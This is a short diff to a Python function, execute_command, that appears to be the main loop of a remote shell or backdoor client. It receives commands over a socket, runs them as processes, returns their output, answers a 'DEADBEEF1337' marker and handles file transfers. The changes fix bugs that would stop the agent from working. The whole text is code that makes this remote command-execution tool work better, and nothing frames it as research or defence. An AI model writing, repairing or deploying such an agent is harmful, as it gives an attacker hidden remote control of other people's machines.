@@ -26,8 +26,8 @@ def execute_command(s):
         data = s.recv(1024)
         print(data)
 
-        if b"DEADBEEF1337":
-            s.sendall("1")
+        if b"DEADBEEF1337" in data:
+            s.send(b"1_3X1T_5TATUS=0")
             continue
 
         if b"sendingfile" in data:
@@ -47,7 +47,7 @@ def execute_command(s):
         stdout_value = proc.stdout.read() + proc.stderr.read()
 
         try:
-            s.sendall(stdout_value)
+            s.send(stdout_value)
         except BrokenPipeError:
             print("Connection closed by the host.")
             break
